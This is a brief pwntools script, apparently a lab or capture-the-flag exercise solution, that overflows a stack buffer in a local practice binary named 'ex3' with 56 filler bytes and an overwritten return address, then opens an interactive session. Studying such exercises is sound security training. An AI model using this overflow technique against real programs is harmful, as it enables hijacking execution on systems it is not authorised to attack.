#!/usr/bin/env python3

from pwn import *

target = process("./bin/ex3")

payload = b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x56\x11\x40\x00\x00\x00\x00\x00"  # craft the payload

target.send(payload) # notice how we're not using 'sendline' so it does not add a newline

target.interactive()
